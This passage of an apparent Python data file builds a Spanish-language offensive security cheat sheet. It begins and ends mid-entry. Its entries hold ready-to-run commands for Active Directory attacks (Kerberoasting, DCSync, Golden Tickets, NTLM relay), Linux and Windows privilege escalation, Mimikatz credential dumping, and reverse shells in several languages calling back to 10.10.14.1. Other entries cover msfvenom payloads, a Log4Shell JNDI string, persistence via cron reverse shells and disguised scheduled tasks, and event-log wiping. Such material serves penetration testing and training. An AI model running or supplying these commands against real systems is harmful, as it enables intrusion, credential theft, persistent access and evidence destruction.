    "Enumera nombres de usuario válidos en el dominio abusando de las respuestas de pre-autenticación Kerberos, sin generar eventos de login fallido.",
    "bash",
    "kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt",
    "ad,kerberos,kerbrute,enumeration", "low",
    "https://github.com/ropnop/kerbrute")

CMD(ad, "AS-REP Roasting",
    "Extrae hashes AS-REP de cuentas con 'no requiere preautenticación Kerberos' activado, para crackear offline.",
    "bash",
    "GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep_hashes.txt",
    "ad,kerberos,asreproast,impacket", "high",
    "https://github.com/fortra/impacket")

CMD(ad, "Kerberoasting",
    "Solicita tickets de servicio (TGS) para cuentas con SPN configurado y extrae los hashes para crackeo offline.",
    "bash",
    "GetUserSPNs.py corp.local/jdoe:'Password123!' -dc-ip 10.10.10.10 -request -outputfile kerberoast_hashes.txt",
    "ad,kerberos,kerberoasting,impacket", "high")

CMD(ad, "Crackeo de hashes Kerberoast/AS-REP con Hashcat",
    "Crackea offline los hashes TGS (modo 13100) o AS-REP (modo 18200) extraídos previamente.",
    "bash",
    "hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force\nhashcat -m 18200 asrep_hashes.txt rockyou.txt --force",
    "ad,hashcat,kerberos,cracking", "high")

CMD(ad, "BloodHound - recolección de datos con bloodhound-python",
    "Recolecta toda la información del dominio (usuarios, grupos, ACLs, sesiones, relaciones de confianza) para análisis de rutas de ataque en BloodHound.",
    "bash",
    "bloodhound-python -u jdoe -p 'Password123!' -d corp.local -ns 10.10.10.10 -c All",
    "ad,bloodhound,enumeration,graphanalysis", "info",
    "https://github.com/dirkjanm/BloodHound.py")

CMD(ad, "BloodHound - consulta Cypher de rutas a Domain Admin",
    "Consulta Cypher personalizada dentro de BloodHound para encontrar el camino más corto desde un usuario hasta Domain Admins.",
    "text",
    'MATCH p=shortestPath((u:User {name:"JDOE@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p',
    "ad,bloodhound,cypher,attackpath", "info")

CMD(ad, "Enumeración de shares SMB",
    "Lista los recursos compartidos SMB accesibles con las credenciales proporcionadas, indicando permisos de lectura/escritura.",
    "bash",
    "netexec smb 10.10.10.10 -u jdoe -p 'Password123!' --shares",
    "ad,smb,shares,enumeration", "info")

CMD(ad, "Montar y explorar share SMB",
    "Conecta interactivamente a un recurso compartido SMB para listar, descargar o subir archivos.",
    "bash",
    "smbclient //10.10.10.10/SHARE -U jdoe%'Password123!'",
    "ad,smb,smbclient,enumeration", "info")

CMD(ad, "Dump de SAM/LSA remoto con secretsdump",
    "Extrae hashes de contraseñas locales (SAM), secretos LSA y, si es DC, el NTDS.dit completo del dominio.",
    "bash",
    "secretsdump.py corp.local/jdoe:'Password123!'@10.10.10.10",
    "ad,impacket,secretsdump,credentialdump", "critical")

CMD(ad, "Pass-the-Hash con Impacket",
    "Autentica usando el hash NTLM directamente, sin necesidad de conocer la contraseña en texto claro.",
    "bash",
    "psexec.py -hashes :NTLM_HASH corp.local/administrator@10.10.10.10",
    "ad,passthehash,impacket,lateralmovement", "critical")

CMD(ad, "Pass-the-Hash con NetExec",
    "Valida y ejecuta comandos en hosts remotos usando un hash NTLM capturado, sin necesidad de crackearlo.",
    "bash",
    "netexec smb 10.10.10.0/24 -u administrator -H NTLM_HASH -x whoami",
    "ad,passthehash,netexec,lateralmovement", "critical")

CMD(ad, "Ejecución remota de comandos con WMIExec",
    "Obtiene una pseudo-shell semi-interactiva en un host remoto del dominio usando WMI.",
    "bash",
    "wmiexec.py corp.local/jdoe:'Password123!'@10.10.10.10",
    "ad,impacket,wmiexec,lateralmovement", "high")

CMD(ad, "Ejecución remota con PsExec (Impacket)",
    "Despliega un servicio temporal en el host remoto para obtener una shell SYSTEM, similar al PsExec de Sysinternals.",
    "bash",
    "psexec.py corp.local/jdoe:'Password123!'@10.10.10.10",
    "ad,impacket,psexec,lateralmovement", "high")

CMD(ad, "Evil-WinRM - shell remota vía WinRM",
    "Obtiene una shell interactiva PowerShell en un host Windows con WinRM habilitado, soporta carga de scripts y transferencia de archivos.",
    "bash",
    "evil-winrm -i 10.10.10.10 -u jdoe -p 'Password123!'",
    "ad,winrm,evilwinrm,lateralmovement", "high",
    "https://github.com/Hackplayers/evil-winrm")

CMD(ad, "DCSync - extracción de hashes de todo el dominio",
    "Simula una replicación de controlador de dominio para extraer todos los hashes de contraseñas del AD (requiere privilegios de replicación).",
    "bash",
    "secretsdump.py corp.local/jdoe:'Password123!'@10.10.10.10 -just-dc-ntlm",
    "ad,dcsync,impacket,credentialdump", "critical")

CMD(ad, "Golden Ticket - persistencia con krbtgt",
    "Forja un Ticket Granting Ticket válido para cualquier usuario usando el hash de la cuenta krbtgt, otorgando acceso persistente al dominio.",
    "bash",
    "ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid S-1-5-21-XXXX -domain corp.local Administrator",
    "ad,goldenticket,impacket,persistence", "critical")

CMD(ad, "Silver Ticket - falsificación de ticket de servicio",
    "Forja un ticket de servicio (TGS) válido para un servicio concreto usando el hash de la cuenta de servicio, sin tocar el KDC.",
    "bash",
    "ticketer.py -nthash SERVICE_NTLM_HASH -domain-sid S-1-5-21-XXXX -domain corp.local -spn cifs/dc01.corp.local Administrator",
    "ad,silverticket,impacket,persistence", "critical")

CMD(ad, "Enumeración con LDAP anónimo",
    "Consulta el directorio LDAP del dominio de forma anónima en busca de información expuesta.",
    "bash",
    'ldapsearch -x -H ldap://10.10.10.10 -b "dc=corp,dc=local"',
    "ad,ldap,enumeration", "info")

CMD(ad, "Enumeración avanzada con ldapdomaindump",
    "Genera un volcado HTML navegable con todos los usuarios, grupos, equipos y políticas del dominio.",
    "bash",
    "ldapdomaindump -u 'corp.local\\\\jdoe' -p 'Password123!' 10.10.10.10",
    "ad,ldap,enumeration,reporting", "info")

CMD(ad, "Abuso de delegación sin restricciones",
    "Identifica equipos con delegación Kerberos sin restricciones, lo que permite capturar TGTs de cualquier usuario que se autentique en ellos.",
    "bash",
    "findDelegation.py corp.local/jdoe:'Password123!'",
    "ad,kerberos,delegation,privesc", "high")

CMD(ad, "PetitPotam - coerción de autenticación NTLM",
    "Fuerza a un controlador de dominio a autenticarse contra un host atacante vía MS-EFSRPC, comúnmente combinado con ADCS para escalada.",
    "bash",
    "python3 PetitPotam.py -u jdoe -p 'Password123!' -d corp.local attacker-ip dc01.corp.local",
    "ad,petitpotam,coercion,ntlmrelay", "critical",
    "https://github.com/topotam/PetitPotam")

CMD(ad, "NTLM Relay con ntlmrelayx",
    "Captura autenticaciones NTLM coaccionadas y las retransmite a otro servicio (LDAP/SMB) para escalar privilegios.",
    "bash",
    "ntlmrelayx.py -t ldap://10.10.10.10 --escalate-user jdoe",
    "ad,ntlmrelay,impacket,privesc", "critical")

CMD(ad, "Auditoría de ADCS con Certipy",
    "Enumera plantillas de certificados vulnerables en Active Directory Certificate Services (ESC1-ESC8) para escalada de privilegios.",
    "bash",
    "certipy find -u jdoe@corp.local -p 'Password123!' -dc-ip 10.10.10.10 -vulnerable",
    "ad,adcs,certipy,privesc", "high",
    "https://github.com/ly4k/Certipy")

CMD(ad, "Responder - captura de hashes NTLM en la red",
    "Levanta servidores falsos (LLMNR/NBT-NS/mDNS) para capturar hashes NetNTLM de equipos que hacen resolución de nombres incorrecta.",
    "bash",
    "responder -I eth0 -dwv",
    "ad,responder,llmnr,ntlmcapture", "high",
    "https://github.com/lgandx/Responder")

CMD(ad, "mitm6 - ataque IPv6 contra Active Directory",
    "Combina la respuesta a solicitudes DHCPv6 con ntlmrelayx para forzar a clientes Windows a autenticarse vía IPv6 y retransmitir credenciales.",
    "bash",
    "mitm6 -d corp.local",
    "ad,mitm6,ipv6,ntlmrelay", "high")


# ════════════════════════════════════════════════════════════════
# 8. ESCALADA DE PRIVILEGIOS - LINUX
# ════════════════════════════════════════════════════════════════
linpriv = SECTION("Privilege Escalation - Linux", "linux")

CMD(linpriv, "LinPEAS - enumeración automática de privesc",
    "Script de enumeración exhaustiva que busca automáticamente vectores de escalada de privilegios en Linux, coloreando hallazgos por relevancia.",
    "bash",
    "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    "linux,privesc,linpeas,enumeration", "info",
    "https://github.com/peass-ng/PEASS-ng")

CMD(linpriv, "LinEnum - enumeración clásica de privesc",
    "Alternativa más ligera a LinPEAS para enumerar configuraciones inseguras, cron jobs, SUID, etc.",
    "bash",
    "./LinEnum.sh -t",
    "linux,privesc,linenum,enumeration", "info")

CMD(linpriv, "Buscar binarios SUID",
    "Lista todos los binarios con el bit SUID activado, candidatos a abuso de privilegios vía GTFOBins.",
    "bash",
    "find / -perm -4000 -type f 2>/dev/null",
    "linux,privesc,suid,enumeration", "info",
    "https://gtfobins.github.io/")

CMD(linpriv, "Buscar binarios SGID",
    "Lista binarios con el bit SGID activado, que ejecutan con el grupo del propietario en lugar del usuario actual.",
    "bash",
    "find / -perm -2000 -type f 2>/dev/null",
    "linux,privesc,sgid,enumeration", "info")

CMD(linpriv, "Comprobar permisos sudo del usuario",
    "Lista qué comandos puede ejecutar el usuario actual con sudo, clave para buscar abusos vía GTFOBins.",
    "bash",
    "sudo -l",
    "linux,privesc,sudo,enumeration", "info")

CMD(linpriv, "Abuso de sudo con GTFOBins (ejemplo find)",
    "Ejemplo de cómo abusar de un binario permitido vía sudo (find) para obtener una shell con privilegios elevados.",
    "bash",
    "sudo find . -exec /bin/sh -p \\; -quit",
    "linux,privesc,gtfobins,sudo", "critical")

CMD(linpriv, "Capabilities - buscar binarios con capabilities peligrosas",
    "Lista binarios con capabilities de Linux asignadas (cap_setuid, cap_net_raw, etc.) que pueden permitir escalada.",
    "bash",
    "getcap -r / 2>/dev/null",
    "linux,privesc,capabilities,enumeration", "info")

CMD(linpriv, "Enumeración de cron jobs",
    "Revisa tareas programadas del sistema y del usuario en busca de scripts editables o ejecutados con privilegios elevados.",
    "bash",
    "cat /etc/crontab\nls -la /etc/cron.*\ncrontab -l",
    "linux,privesc,cron,enumeration", "info")

CMD(linpriv, "Búsqueda de credenciales en archivos de configuración",
    "Busca contraseñas, claves API o tokens olvidados en archivos de configuración comunes del sistema.",
    "bash",
    """grep -ri "password" /etc/*.conf 2>/dev/null
find / -name "*.env" -o -name "*config*" 2>/dev/null | grep -v proc
cat ~/.bash_history 2>/dev/null""",
    "linux,privesc,credentials,enumeration", "medium")

CMD(linpriv, "Explotación de PATH hijacking",
    "Aprovecha un script ejecutado con privilegios elevados que llama a un binario sin ruta absoluta, anteponiendo un directorio controlado al PATH.",
    "bash",
    """echo '/bin/bash' > /tmp/exploit/ls
chmod +x /tmp/exploit/ls
export PATH=/tmp/exploit:$PATH""",
    "linux,privesc,pathhijacking", "high")

CMD(linpriv, "Explotación de Docker mal configurado",
    "Si el usuario pertenece al grupo docker (equivalente a root), monta el filesystem raíz dentro de un contenedor para escalar.",
    "bash",
    "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "linux,privesc,docker,container", "critical")

CMD(linpriv, "Enumeración de variables de entorno",
    "Revisa variables de entorno en busca de tokens, claves o configuraciones sensibles olvidadas.",
    "bash",
    "env\ncat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'",
    "linux,privesc,environment,enumeration", "info")

CMD(linpriv, "Escalada vía Polkit / pkexec (CVE-2021-4034)",
    "Explota la vulnerabilidad PwnKit en pkexec para escalar a root en sistemas Linux no parcheados.",
    "bash",
    "git clone https://github.com/berdav/CVE-2021-4034\ncd CVE-2021-4034 && make\n./cve-2021-4034",
    "linux,privesc,pwnkit,cve,polkit", "critical",
    "https://github.com/berdav/CVE-2021-4034")

CMD(linpriv, "pspy - monitorización de procesos sin privilegios",
    "Observa procesos en ejecución sin necesidad de privilegios root, útil para detectar cron jobs o scripts ejecutados periódicamente.",
    "bash",
    "./pspy64 -pf -i 1000",
    "linux,privesc,pspy,monitoring", "info",
    "https://github.com/DominicBreuker/pspy")

CMD(linpriv, "Kernel exploit suggester (Linux Exploit Suggester)",
    "Compara la versión del kernel contra una base de datos de exploits conocidos de escalada de privilegios.",
    "bash",
    "./linux-exploit-suggester.sh",
    "linux,privesc,kernel,exploit", "medium")

CMD(linpriv, "Escritura en /etc/passwd para crear usuario root",
    "Si /etc/passwd es escribible, añade un nuevo usuario con UID 0 (root) y contraseña conocida.",
    "bash",
    "openssl passwd -1 -salt abc Password123\necho 'rootuser:$1$abc$HASH_GENERADO:0:0:root:/root:/bin/bash' >> /etc/passwd",
    "linux,privesc,etcpasswd,writable", "critical")


# ════════════════════════════════════════════════════════════════
# 9. ESCALADA DE PRIVILEGIOS - WINDOWS
# ════════════════════════════════════════════════════════════════
winpriv = SECTION("Privilege Escalation - Windows", "windows")

CMD(winpriv, "WinPEAS - enumeración automática de privesc",
    "Script de enumeración exhaustiva de vectores de escalada de privilegios en Windows: servicios, registro, tareas, credenciales, etc.",
    "powershell",
    ".\\winPEASx64.exe",
    "windows,privesc,winpeas,enumeration", "info",
    "https://github.com/peass-ng/PEASS-ng")

CMD(winpriv, "PowerUp - enumeración de privesc en PowerShell",
    "Script de PowerShell que busca automáticamente configuraciones inseguras explotables para escalar privilegios.",
    "powershell",
    "Import-Module .\\PowerUp.ps1; Invoke-AllChecks",
    "windows,privesc,powerup,powershell", "info")

CMD(winpriv, "Comprobar privilegios del token actual",
    "Lista los privilegios asignados al usuario actual; privilegios como SeImpersonatePrivilege son explotables.",
    "powershell",
    "whoami /priv",
    "windows,privesc,tokens,enumeration", "info")

CMD(winpriv, "PrintSpoofer - abuso de SeImpersonatePrivilege",
    "Explota el privilegio SeImpersonatePrivilege (común en cuentas de servicio IIS) para obtener una shell SYSTEM.",
    "powershell",
    ".\\PrintSpoofer.exe -i -c cmd",
    "windows,privesc,printspoofer,seimpersonate", "critical",
    "https://github.com/itm4n/PrintSpoofer")

CMD(winpriv, "GodPotato - abuso de SeImpersonatePrivilege (moderno)",
    "Alternativa moderna a PrintSpoofer/JuicyPotato compatible con versiones recientes de Windows Server.",
    "powershell",
    "GodPotato.exe -cmd \"cmd /c whoami\"",
    "windows,privesc,godpotato,seimpersonate", "critical")

CMD(winpriv, "Enumeración de servicios con permisos débiles",
    "Busca servicios de Windows cuyo binario o configuración pueda ser modificado por el usuario actual.",
    "powershell",
    "wmic service get name,displayname,pathname,startmode | findstr /i /v 'C:\\\\Windows\\\\\\\\'",
    "windows,privesc,services,enumeration", "info")

CMD(winpriv, "Accesschk - comprobar permisos de servicio",
    "Verifica permisos efectivos sobre un servicio concreto usando la suite Sysinternals.",
    "powershell",
    "accesschk.exe -uwcqv \"Authenticated Users\" *",
    "windows,privesc,accesschk,sysinternals", "info")

CMD(winpriv, "Búsqueda de contraseñas en archivos y registro",
    "Busca credenciales en texto plano en archivos de configuración comunes y claves de registro típicas (Autologon, VNC, etc.).",
    "powershell",
    """reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword
findstr /si password *.xml *.ini *.txt *.config 2>nul""",
    "windows,privesc,credentials,registry", "medium")

CMD(winpriv, "Mimikatz - extracción de credenciales en memoria",
    "Extrae contraseñas en texto claro, hashes NTLM y tickets Kerberos directamente de la memoria del proceso LSASS.",
    "powershell",
    "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
    "windows,privesc,mimikatz,credentialdump", "critical",
    "https://github.com/gentilkiwi/mimikatz")

CMD(winpriv, "Volcado de LSASS con procdump (sigiloso)",
    "Vuelca el proceso LSASS a disco usando una herramienta legítima de Sysinternals para analizarlo offline con Mimikatz/pypykatz, evitando detección directa.",
    "powershell",
    "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
    "windows,privesc,lsass,procdump,credentialdump", "high")

CMD(winpriv, "AlwaysInstallElevated - escalada vía MSI",
    "Si la clave AlwaysInstallElevated está activada, cualquier usuario puede instalar paquetes MSI maliciosos con privilegios SYSTEM.",
    "powershell",
    """reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f msi -o malicious.msi
msiexec /quiet /qn /i malicious.msi""",
    "windows,privesc,alwaysinstallelevated,msi", "critical")

CMD(winpriv, "Unquoted Service Path - escalada de privilegios",
    "Identifica y explota rutas de servicio sin comillas que contienen espacios, permitiendo colocar un ejecutable malicioso en una ruta intermedia.",
    "powershell",
    'wmic service get name,pathname | findstr /i /v "C:\\\\Windows\\\\\\\\" | findstr /i /v """"',
    "windows,privesc,unquotedpath,services", "high")

CMD(winpriv, "Token impersonation con incognito (Meterpreter)",
    "Lista y suplanta tokens de otros usuarios conectados desde una sesión Meterpreter para escalar privilegios.",
    "text",
    "load incognito\nlist_tokens -u\nimpersonate_token \"NT AUTHORITY\\\\SYSTEM\"",
    "windows,privesc,incognito,meterpreter,tokens", "high")

CMD(winpriv, "DLL Hijacking - búsqueda de DLLs faltantes",
    "Detecta intentos de carga de DLLs inexistentes por procesos privilegiados, susceptibles de hijacking si el directorio es escribible.",
    "powershell",
    "Procmon.exe /AcceptEula /Quiet /Backingfile trace.pml",
    "windows,privesc,dllhijacking,procmon", "high")

CMD(winpriv, "WES-NG - sugeridor de exploits de Windows",
    "Compara la salida de systeminfo contra una base de datos de CVEs conocidos del kernel/sistema para sugerir exploits de privesc.",
    "bash",
    "systeminfo > systeminfo.txt\npython3 wes.py systeminfo.txt -i \"Elevation of Privilege\"",
    "windows,privesc,wesng,kernel,exploit", "medium",
    "https://github.com/bitsadmin/wesng")


# ════════════════════════════════════════════════════════════════
# 10. EXPLOTACIÓN, REVERSE SHELLS Y METASPLOIT
# ════════════════════════════════════════════════════════════════
exploit = SECTION("Explotación & Reverse Shells", "exploit")

CMD(exploit, "Listener con Netcat",
    "Levanta un listener en el puerto indicado para recibir una conexión reversa entrante.",
    "bash",
    "nc -lvnp 4444",
    "exploit,netcat,listener,reverseshell", "info")

CMD(exploit, "Reverse shell Bash",
    "Reverse shell clásica usando /dev/tcp, no requiere netcat en el objetivo.",
    "bash",
    "bash -i >& /dev/tcp/10.10.14.1/4444 0>&1",
    "exploit,reverseshell,bash", "critical",
    "https://www.revshells.com/")

CMD(exploit, "Reverse shell Python",
    "Reverse shell en Python3 que abre un pseudo-pty interactivo hacia el atacante.",
    "python",
    """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'""",
    "exploit,reverseshell,python", "critical")

CMD(exploit, "Reverse shell PHP",
    "Reverse shell en una línea para entornos PHP, útil al subir un archivo o explotar un LFI/RCE en una aplicación PHP.",
    "php",
    "php -r '$sock=fsockopen(\"10.10.14.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "exploit,reverseshell,php", "critical")

CMD(exploit, "Reverse shell PowerShell",
    "One-liner de PowerShell para obtener una shell reversa interactiva desde un host Windows.",
    "powershell",
    "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()",
    "exploit,reverseshell,powershell", "critical")

CMD(exploit, "Reverse shell Netcat (con -e)",
    "Reverse shell con netcat clásico cuando el binario soporta la opción -e (ejecutar shell directamente).",
    "bash",
    "nc -e /bin/sh 10.10.14.1 4444",
    "exploit,reverseshell,netcat", "critical")

CMD(exploit, "Estabilizar shell TTY (Python pty)",
    "Convierte una shell reversa básica en una pseudo-terminal completa con autocompletado, historial y Ctrl+C funcional.",
    "bash",
    """python3 -c 'import pty; pty.spawn("/bin/bash")'
# Luego en el host atacante:
# Ctrl+Z
# stty raw -echo; fg
# Y en la shell remota:
# export TERM=xterm""",
    "exploit,stabilization,tty,pty", "info")

CMD(exploit, "Generar payload con MSFvenom (Windows reverse TCP)",
    "Genera un ejecutable Windows con payload Meterpreter reverse TCP usando msfvenom.",
    "bash",
    "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o shell.exe",
    "exploit,msfvenom,payload,meterpreter", "critical")

CMD(exploit, "Generar payload con MSFvenom (Linux ELF)",
    "Genera un binario ELF de Linux con shell reversa TCP en formato ejecutable.",
    "bash",
    "msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f elf -o shell.elf",
    "exploit,msfvenom,payload,linux", "critical")

CMD(exploit, "Generar payload con MSFvenom (webshell PHP)",
    "Genera una webshell PHP funcional con Meterpreter embebido para subir a aplicaciones vulnerables.",
    "bash",
    "msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f raw -o shell.php",
    "exploit,msfvenom,payload,php,webshell", "critical")

CMD(exploit, "Metasploit - iniciar consola y módulo handler",
    "Inicia msfconsole y configura un manejador (handler) para recibir la conexión de un payload Meterpreter.",
    "bash",
    """msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.14.1
set LPORT 4444
run""",
    "exploit,metasploit,handler,meterpreter", "info")

CMD(exploit, "Metasploit - búsqueda de exploits por servicio",
    "Busca módulos de exploit disponibles relacionados con un servicio o CVE concreto dentro de Metasploit.",
    "text",
    "search type:exploit name:eternalblue\nsearch cve:2021-44228",
    "exploit,metasploit,search", "info")

CMD(exploit, "Transferencia de archivos - servidor HTTP Python",
    "Levanta un servidor HTTP simple para servir herramientas o exfiltrar archivos durante la post-explotación.",
    "bash",
    "python3 -m http.server 8000",
    "exploit,fileexfil,python,httpserver", "info")

CMD(exploit, "Transferencia de archivos - descarga con PowerShell",
    "Descarga un archivo desde un servidor controlado por el atacante hacia un host Windows comprometido.",
    "powershell",
    "iwr -uri http://10.10.14.1:8000/winpeas.exe -outfile winpeas.exe",
    "exploit,fileexfil,powershell,download", "info")

CMD(exploit, "Transferencia de archivos - certutil (LOLBin)",
    "Usa certutil, un binario legítimo de Windows, para descargar archivos evitando levantar alertas de descarga directa.",
    "powershell",
    "certutil.exe -urlcache -split -f http://10.10.14.1:8000/nc.exe nc.exe",
    "exploit,fileexfil,certutil,lolbin", "medium")

CMD(exploit, "Bind shell con Socat (con TTY completo)",
    "Establece una shell con TTY completo desde el inicio usando socat, evitando el proceso manual de estabilización.",
    "bash",
    "# En el atacante:\nsocat file:`tty`,raw,echo=0 tcp-listen:4444\n\n# En la víctima:\nsocat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.1:4444",
    "exploit,socat,reverseshell,tty", "critical")

CMD(exploit, "Searchsploit - búsqueda local de exploits",
    "Busca en la base de datos local de Exploit-DB exploits relacionados con una tecnología o versión concreta.",
    "bash",
    "searchsploit apache 2.4.49\nsearchsploit -m 50383  # copiar exploit por su ID",
    "exploit,searchsploit,exploitdb", "info")

CMD(exploit, "Log4Shell - PoC de explotación (CVE-2021-44228)",
    "Payload de prueba de concepto para la vulnerabilidad Log4Shell mediante JNDI lookup malicioso.",
    "text",
    "${jndi:ldap://10.10.14.1:1389/Exploit}",
    "exploit,log4shell,cve,rce,java", "critical",
    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228")


# ════════════════════════════════════════════════════════════════
# 11. POST-EXPLOTACIÓN Y MOVIMIENTO LATERAL
# ════════════════════════════════════════════════════════════════
postex = SECTION("Post-Explotación", "key")

CMD(postex, "Meterpreter - comandos básicos de post-explotación",
    "Comandos esenciales dentro de una sesión Meterpreter para reconocimiento del host comprometido.",
    "text",
    """sysinfo
getuid
ps
migrate <PID>
hashdump
screenshot""",
    "postexploitation,meterpreter,enumeration", "info")

CMD(postex, "Búsqueda de archivos sensibles en el sistema",
    "Busca archivos con nombres relacionados con credenciales, claves SSH o configuraciones sensibles tras obtener acceso.",
    "bash",
    """find / -iname "*.pem" -o -iname "id_rsa*" -o -iname "*password*" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null   # bases de datos KeePass""",
    "postexploitation,linux,credentials,enumeration", "medium")

CMD(postex, "Volcado de hashes locales (Linux)",
    "Combina /etc/passwd y /etc/shadow para preparar el crackeo offline de contraseñas locales.",
    "bash",
    "unshadow /etc/passwd /etc/shadow > combined_hashes.txt",
    "postexploitation,linux,credentialdump,unshadow", "high")

CMD(postex, "Pivoting con Chisel (túnel SOCKS reverso)",
    "Crea un túnel reverso SOCKS5 a través de un host comprometido para alcanzar redes internas no enrutables directamente.",
    "bash",
    """# En el atacante (servidor):
./chisel server -p 8000 --reverse

# En la víctima (cliente):
./chisel client 10.10.14.1:8000 R:socks""",
    "postexploitation,pivoting,chisel,tunneling", "high",
    "https://github.com/jpillora/chisel")

CMD(postex, "Pivoting con autorrutas de Metasploit",
    "Añade una ruta interna a través de una sesión Meterpreter comprometida para alcanzar otra subred desde Metasploit.",
    "text",
    "run autoroute -s 172.16.0.0/24\nuse auxiliary/server/socks_proxy\nset SRVPORT 1080\nrun",
    "postexploitation,pivoting,metasploit,autoroute", "high")

CMD(postex, "SSH port forwarding (local)",
    "Redirige un puerto local hacia un servicio interno solo accesible desde el host comprometido vía SSH.",
    "bash",
    "ssh -L 8080:127.0.0.1:80 jdoe@10.10.10.10",
    "postexploitation,pivoting,ssh,portforwarding", "info")

CMD(postex, "SSH dynamic port forwarding (SOCKS proxy)",
    "Crea un proxy SOCKS dinámico vía SSH para enrutar tráfico de herramientas (proxychains) a través del host comprometido.",
    "bash",
    "ssh -D 1080 jdoe@10.10.10.10 -N",
    "postexploitation,pivoting,ssh,socks,proxychains", "info")

CMD(postex, "Proxychains - encadenar herramientas vía proxy SOCKS",
    "Ejecuta cualquier herramienta a través de un proxy SOCKS configurado previamente (por ejemplo, mediante SSH -D o Chisel).",
    "bash",
    "proxychains nmap -sT -Pn 172.16.0.5",
    "postexploitation,pivoting,proxychains", "info")

CMD(postex, "Persistencia Linux - clave SSH autorizada",
    "Añade una clave pública SSH del atacante al archivo authorized_keys para mantener acceso persistente.",
    "bash",
    "mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...clave_publica...' >> ~/.ssh/authorized_keys",
    "postexploitation,persistence,linux,ssh", "high")

CMD(postex, "Persistencia Linux - cron job",
    "Crea una tarea cron que ejecuta periódicamente una reverse shell, asegurando reconexión si se pierde el acceso.",
    "bash",
    '(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c \'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1\'") | crontab -',
    "postexploitation,persistence,linux,cron", "high")

CMD(postex, "Persistencia Windows - tarea programada",
    "Crea una tarea programada en Windows que ejecuta un payload de forma recurrente para mantener el acceso.",
    "powershell",
    'schtasks /create /sc minute /mo 5 /tn "WindowsUpdateCheck" /tr "C:\\Windows\\Temp\\update.exe" /ru SYSTEM',
    "postexploitation,persistence,windows,scheduledtask", "high")

CMD(postex, "Persistencia Windows - clave de registro Run",
    "Añade una entrada al registro Run para ejecutar un payload automáticamente al iniciar sesión un usuario.",
    "powershell",
    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d "C:\\Windows\\Temp\\update.exe"',
    "postexploitation,persistence,windows,registry", "high")

CMD(postex, "Limpieza de logs (anti-forense, solo en entornos autorizados)",
    "Elimina entradas de logs de eventos en un engagement autorizado donde el alcance permita pruebas de evasión, manteniendo trazabilidad en el informe interno.",
    "powershell",
    "wevtutil cl Security\nwevtutil cl System\nwevtutil cl Application",
    "postexploitation,antiforensics,logs,windows", "high")


# ════════════════════════════════════════════════════════════════
# 12. CRACKING DE CONTRASEÑAS Y HASHES
# ════════════════════════════════════════════════════════════════
crack = SECTION("Cracking de Contraseñas", "key")

CMD(crack, "Identificación de tipo de hash",
    "Identifica el algoritmo más probable de un hash desconocido antes de intentar crackearlo.",
    "bash",
    "hashid 'HASH_AQUI'\nhash-identifier",
    "cracking,hashid,enumeration", "info")

CMD(crack, "Hashcat - ataque de diccionario",
    "Crackea un hash usando un ataque de diccionario clásico contra una wordlist (rockyou.txt es la más habitual).",
    "bash",
    "hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
    "cracking,hashcat,dictionary,wordlist", "high")

CMD(crack, "Hashcat - ataque por reglas",
    "Aplica reglas de mutación (mayúsculas, sufijos numéricos, leetspeak) a una wordlist base para aumentar la cobertura.",
    "bash",
    "hashcat -m 0 -a 0 hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
    "cracking,hashcat,rules,mutation", "high")

CMD(crack, "Hashcat - ataque de fuerza bruta con máscara",
    "Ataque de fuerza bruta dirigido usando una máscara que define la estructura conocida o sospechada de la contraseña.",
    "bash",
    "hashcat -m 0 -a 3 hashes.txt ?u?l?l?l?l?d?d?d",
    "cracking,hashcat,bruteforce,mask", "medium")

CMD(crack, "Hashcat - crackeo de hashes NTLM",
    "Crackea hashes NTLM de Windows (modo 1000) extraídos vía secretsdump o mimikatz.",
    "bash",
    "hashcat -m 1000 ntlm_hashes.txt rockyou.txt",
    "cracking,hashcat,ntlm,windows", "high")

CMD(crack, "Hashcat - crackeo de hashes bcrypt",
